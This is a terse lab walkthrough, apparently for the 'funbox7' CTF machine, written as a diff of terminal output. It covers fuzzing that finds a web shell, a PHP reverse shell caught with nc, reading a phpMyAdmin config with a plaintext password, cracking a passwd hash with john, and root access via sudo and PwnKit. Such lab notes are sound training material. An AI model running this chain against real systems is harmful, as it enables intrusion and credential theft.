@@ -1,0 +1,189 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://192.168.243.132/FUZZ.php --hh 277,10918
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.243.132/FUZZ.php
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000007:   403        9 L      28 W       280 Ch      ".html"                                             
+000000038:   403        9 L      28 W       280 Ch      ".htm"                                              
+000000589:   403        9 L      28 W       280 Ch      ".htaccess"                                         
+000002138:   403        9 L      28 W       280 Ch      ".htc"                                              
+000002480:   200        114 L    263 W      3828 Ch     "mini"    
+
+
+
+
+Zerion Mini Shell 1.0
+
+upload pentestmonkey reverse php
+chmod 4607 ??
+
+http://192.168.243.132/revshellphp.php
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001       
+listening on [any] 9001 ...
+connect to [192.168.45.212] from (UNKNOWN) [192.168.243.132] 55548
+Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 09:21:32 up 49 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+
+www-data@funbox7:/home$ find / -perm -u=s -type f 2>/dev/null
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/umount
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+
+
+www-data@funbox7:/etc/phpmyadmin$ ls
+apache.conf  config-db.php	    config.header.inc.php  htpasswd.setup  phpmyadmin.desktop
+conf.d	     config.footer.inc.php  config.inc.php	   lighttpd.conf   phpmyadmin.service
+www-data@funbox7:/etc/phpmyadmin$ cat config-db.php 
+<?php
+##
+## database access settings in php format
+## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
+## by /usr/sbin/dbconfig-generate-include
+##
+## by default this file is managed via ucf, so you shouldn't have to
+## worry about manual changes being silently discarded.  *however*,
+## you'll probably also want to edit the configuration file mentioned
+## above too.
+##
+$dbuser='phpmyadmin';
+$dbpass='tgbzhnujm!';
+
+
+
+
+
+www-data@funbox7:/etc/phpmyadmin$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+karla:x:1000:1000:karla:/home/karla:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+harry:x:1001:1001:,,,:/home/harry:/bin/bash
+sally:x:1002:1002:,,,:/home/sally:/bin/bash
+goat:x:1003:1003:,,,:/home/goat:/bin/bash
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+lissy:x:1005:1005::/home/lissy:/bin/sh
+www-data@funbox7:/etc/phpmyadmin$ 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hiphop           (?)     
+1g 0:00:00:00 DONE (2025-11-17 04:27) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+www-data@funbox7:/etc/phpmyadmin$ su oracle 
+Password: 
+oracle@funbox7:/etc/phpmyadmin$ sudo -l
+[sudo] password for oracle: 
+Sorry, user oracle may not run sudo on funbox7.
+oracle@funbox7:/etc/phpmyadmin$ cd /home/oracle
+oracle@funbox7:~$ ls
+oracle@funbox7:~$ ls -lsa
+total 24
+4 drwxr-xr-x 3 oracle oracle 4096 Nov 17 09:28 .
+4 drwxr-xr-x 7 root   root   4096 Sep 18  2020 ..
+0 lrwxrwxrwx 1 root   root      9 Jan 28  2021 .bash_history -> /dev/null
+4 -rw-r--r-- 1 oracle oracle  220 Sep 18  2020 .bash_logout
+4 -rw-r--r-- 1 oracle oracle 3771 Sep 18  2020 .bashrc
+4 drwx------ 3 oracle oracle 4096 Nov 17 09:28 .gnupg
+4 -rw-r--r-- 1 oracle oracle  807 Sep 18  2020 .profile
+oracle@funbox7:~$ su karla
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+karla@funbox7:/home/oracle$ 
+
+
+
+karla is the phpmyadmin user
+
+
+karla@funbox7:/home/oracle$ sudo -l
+[sudo] password for karla: 
+Matching Defaults entries for karla on funbox7:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User karla may run the following commands on funbox7:
+    (ALL : ALL) ALL
+karla@funbox7:/home/oracle$ 
+karla@funbox7:/home/oracle$ sudo /bin/bash -p
+root@funbox7:/home/oracle# id
+uid=0(root) gid=0(root) groups=0(root)
+root@funbox7:/home/oracle# 
+
+
+revisiting pwnkit
+
+
+https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
+
+
+oracle@funbox7:~$ ./PwnKit.sh
+root@funbox7:/home/oracle#
+
+
+
+
+
+
+
+
+
+
+
